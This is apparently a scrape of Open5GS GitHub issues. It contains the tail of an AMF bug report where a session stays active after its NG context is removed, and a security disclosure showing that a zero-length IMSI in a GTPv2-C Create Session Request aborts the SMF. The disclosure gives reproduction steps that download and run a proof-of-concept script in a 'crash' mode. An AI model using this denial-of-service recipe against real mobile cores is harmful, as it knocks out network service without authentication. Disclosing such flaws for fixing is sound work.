2. Restart the gNB (or otherwise force the UE to re-register) so a second `InitialUEMessage` arrives for the same UE while the AMF still holds the NG context. `HOLDING_NG_CONTEXT()` fires — visible as `Holding NG Context` in the AMF log.
3. Let `t_ng_holding` expire. `Action: NG context remove` is logged and `ran_ue_remove()` runs.
4. Observe: SMF session still `ACTIVATED`; no paging; downlink to the UE's IP is discarded.

We reach this routinely, not exceptionally — over one 11-hour window a single deployment logged `Holding NG Context` 12+ times, from two call sites: `ngap-handler.c` (second `InitialUEMessage` with the same 5G-S-TMSI) and `amf-sm.c` (`NAS MAC verification failed`, where the UE presents a GUTI the AMF cannot verify). Both are ordinary UE behaviour.

### Scope, and why this is not the already-fixed issues

- **#4547 / #4566** — same trigger, and #4566 fixed the receive-side handling (the AMF answering `Error Indication (unknown-local-UE-NGAP-ID)` for RAN resources it had silently dropped). The session-state half was not addressed.
- **#4346** — fixes the `ran_ue->deactivation.group` assert in `amf_nsmf_pdusession_handle_update_sm_context()` by snapshotting the RAN-UE id in the SBI transaction. It does not touch `ngap-handler.c`.
- **#4550** — `amf_ue_set_suci()` shallow-copies `sess_list` onto a new `amf_ue`; that is an `amf_ue`-level transplant, and its proposed fix operates on the old `amf_ue`. The path here removes only the `ran_ue` and leaves the `amf_ue` alive, so that fix would not run.
- **#4575** — `amf_ue` pool-slot leak. Different symptom.

The branch is byte-identical across v2.7.6, v2.7.7, v2.8.0 and current `main` (129-line function, `diff` reports no change), so this is not a regression and not version-specific.

### A complication worth flagging

At the point this branch runs, the `ran_ue` has already been detached from its `amf_ue` (`HOLDING_NG_CONTEXT()` sets `amf_ue_id = OGS_INVALID_POOL_ID`), so the handler may not have a route to the session list it would need to deactivate. If so, the right place to act may be at holding time rather than at timer expiry. We did not want to guess at the intended design — hence an issue rather than a patch.

### We can help validate a fix

We run this on real radio hardware with a fleet of commercial handsets, and the trigger occurs routinely rather than needing to be contrived — so we are in a good position to test a candidate fix under the conditions that actually produce it. Specifically, we can:

- **Run a patched build** on a live SA deployment (USRP B210 + srsRAN gNB, commercial Samsung handsets, private PLMN) and report back what we observe.
- **Capture full logs** for a captured occurrence — AMF, SMF and PFCP — including the `Holding NG Context` → `Action: NG context remove` sequence and the SMF-side session state that follows it. Say what verbosity and which NFs are most useful and we will collect it.
- **Confirm or refute the symptom** on request: whether the session stays `ACTIVATED` after the RAN context is removed, whether paging is ever attempted, and whether the UE is assigned a new IP on its eventual re-registration.
- **Test against the handover path** as a regression check, since any fix here touches a switch that also serves handover release actions.

If the fix turns out to belong at holding time rather than at timer expiry — or needs a design decision we should not be making from outside — we are happy to test whichever shape you prefer rather than push our own.

Environment: v2.7.6, SA, single AMF/SMF/UPF, commercial handsets on a private PLMN.

items.title: [Bug]: a 34-octet Create Session Request with a Zero-Length IMSI IE Aborts the SMF (`ogs_assert(imsi_len)`)

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Summary

- **Commit ID**: `157f611a530e292e40ec50f9d23f0ef5d4fcd6a6` (tag `v2.8.0`)
- **CVSS 4.0**: 8.7 (High) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- **Vulnerability Type**: CWE-617 / CWE-20 (Reachable Assertion / Improper Input Validation)

The SMF/PGW's GTPv2-C endpoint (UDP 2123) accepts Create Session Requests from any peer. `smf_sess_add_by_gtp2_message()` checks only that an IMSI information element is *present* in the request, then hands the element's data pointer and its length straight to `smf_ue_find_by_imsi()` — whose first statement asserts that the length is non-zero. A request whose IMSI IE is present but zero-length therefore walks from the session-creation entry point into an unconditional `ogs_assert(imsi_len)`.

The gate is missing because the IE length is never validated before the lookup: the presence check passes on the (data, len = 0) pair produced by a truncated IE, and nothing between it and the lookup rejects an empty identifier. Upstream has fixed the identical assertion shape in the SGW-C twin of this code but left the SMF copy untouched, so the path remains reachable on a current build.

`ogs_assert()` is compiled in unconditionally: on failure it logs a FATAL line, prints a backtrace and calls `abort()`, so one 34-octet UDP datagram kills the SMF/PGW process with SIGABRT (container exit 134). The NF stays down until an operator restarts it, and the neighbour NFs de-register it as heartbeats stop.


### Open5GS Release, Revision, or Tag

v2.8.0; `main` is still affected.

### Steps to reproduce

Tested target: the `docker_open5gs` compose deployment (open5GS SA + VoNR, 23 containers); attacker runs on the Docker host (bridge `172.22.0.1`); SMF GTP-C at `172.22.0.7:2123/udp`. No subscribers, no RAN.

1. **Deploy the target core**

   ```bash
   git clone https://github.com/hackeryounow/5gc-deployments.git
   cd 5gc-deployments/open5gs/vonr-2.8.1-gamma
   docker compose -p docker_open5gs -f sa-vonr-deploy-2.8.1-gamma.yaml up -d
   sleep 45                     # let the NFs register at the NRF
   docker start smsc            # smsc races the MySQL init on a cold start
   # provision
   pip3 install git+https://github.com/hackeryounow/coresimrunner.git@v1.4.0
   coresimrunner --mode provision --core-network open5gs --count 5 \
        --plmn 46009 --initial-imsi-index 1 \
        --ki 12341234123412341234123412340000 \
        --opc 71a121bb69baf3c0cc53fb5038a0131f \
        --dnn internet --enable-ims \
        --core-address 127.0.0.1 --webui-port 9999 \
        --username admin --password 1423
   ```

2. **Confirm the SMF answers GTPv2-C Echo**

   ```bash
   wget https://raw.githubusercontent.com/hackeryounow/5GCVulDB/refs/heads/main/VUL-20260926-POC/smf_gtpc_zerolen_imsi_poc.py
   chmod +x smf_gtpc_zerolen_imsi_poc.py
   ./smf_gtpc_zerolen_imsi_poc.py --target 172.22.0.7 --port 2123 --mode echo
   # -> pre-shot liveness: alive=True  (Echo Response received)
   ```

3. **Run the well-formed control** (same IEs, plus an 8-octet BCD IMSI — 42 octets on the wire)

   ```bash
   ./smf_gtpc_zerolen_imsi_poc.py --target 172.22.0.7 --port 2123 --mode control
   # -> Create Session Response, cause 0x46 = 70 (Mandatory IE missing); SMF stays alive
   ```

4. **Fire the defect and verify** (34-octet request, IMSI IE length 0)

   ```bash
   ./smf_gtpc_zerolen_imsi_poc.py --target 172.22.0.7 --port 2123 --mode crash
   # -> post-shot liveness: alive=False  (no Echo Response)
   docker inspect -f '{{.State.Status}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}}' smf
   # -> exited exit=134 oom=false
   docker logs smf 2>&1 | tail -15
   ```


### Logs

```shell
`docker logs smf` — the abort after the 34-octet datagram arrives:


10/11 12:40:34.354: [smf] FATAL: smf_ue_find_by_imsi: Assertion `imsi_len' failed. (../src/smf/context.c:1380)
10/11 12:40:34.355: [core] FATAL: backtrace() returned 9 addresses (../lib/core/ogs-abort.c:37)
./open5gs-smfd(+0x1a17d) [0x557dd132e17d]
./open5gs-smfd(+0x1b99a) [0x557dd132f99a]
./open5gs-smfd(+0x29122) [0x557dd133d122]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x113) [0x7fe7fc96f2bd]
./open5gs-smfd(+0x11ee1) [0x557dd1325ee1]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(+0x12960) [0x7fe7fc95f960]
/lib/x86_64-linux-gnu/libpthread.so.0(+0x8609) [0x7fe7fb5a2609]
/lib/x86_64-linux-gnu/libc.so.6(clone+0x43) [0x7fe7fb4c7353]
/open5gs_init.sh: line 102:    60 Aborted                 (core dumped) ./open5gs-smfd
```

### Expected behaviour

A malformed IMSI IE must be rejected at the protocol level — the request discarded or answered with a Create Session Response carrying an error cause — and the process must never terminate on peer-controlled input. The well-formed control shows the SMF answering `cause 70` and remaining alive; the zero-length variant must degrade exactly the same way.


### Observed Behaviour

One unauthenticated 34-octet datagram: the SMF logs the FATAL assertion at `src/smf/context.c:1380`, aborts (`exit=134`, `oom=false`) and stops answering GTPv2-C Echo. The PoC reports `alive=True` before the shot and `alive=False` after it. Neighbour NFs then lose their peer — the NRF/SCP mark the SMF de-registered on missed heartbeats and the UPF logs the loss of its PFCP peer — leaving the core degraded until the SMF is restarted manually.

### eNodeB/gNodeB

None — control-plane-only attack, no radio access network involved.

### UE Models and versions

None — no UE involved.

items.title: [Bug]: AMF crash after oversized `smf-select-data` `dnnInfos` import via later subscribed-info cleanup
